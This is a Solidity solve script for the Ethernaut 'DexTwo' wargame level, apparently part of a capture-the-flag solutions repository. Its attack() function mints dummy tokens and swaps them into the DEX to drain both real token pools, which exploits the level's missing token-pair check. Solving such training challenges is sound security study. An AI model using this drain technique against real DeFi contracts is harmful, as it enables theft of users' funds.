// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {DexTwo, SwappableTokenTwo} from "ethernaut/levels/DexTwo.sol";

contract Check is CheckScript("DEX_TWO") {}

contract Solve is SolveScript("DEX_TWO") {
    DexTwo target;
    SwappableTokenTwo private token1;
    SwappableTokenTwo private token2;
    uint256 constant MAX_ITERS = 10;

    constructor() {
        target = DexTwo(instance);
        token1 = SwappableTokenTwo(target.token1());
        token2 = SwappableTokenTwo(target.token2());
    }

    // utility to return the token balances for the player and DEX
    function balances() private view returns (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) {
        // player balances
        pb1 = token1.balanceOf(player);
        pb2 = token2.balanceOf(player);

        // dex balances
        db1 = token1.balanceOf(address(target));
        db2 = token2.balanceOf(address(target));
    }

    function attack() public override {
        // create your own dummy tokens
        SwappableTokenTwo dummy1 = new SwappableTokenTwo(address(target), "Dummy 1", "DUM1", 200);
        SwappableTokenTwo dummy2 = new SwappableTokenTwo(address(target), "Dummy 2", "DUM2", 200);

        // transfer half of the tokens to Dex
        dummy1.transfer(address(target), 100);
        dummy2.transfer(address(target), 100);

        // approve other half of the tokens to Dex
        dummy1.approve(address(target), 100);
        dummy2.approve(address(target), 100);

        // deplete tokens
        target.swap(address(dummy1), address(token1), 100);
        target.swap(address(dummy2), address(token2), 100);
    }
}
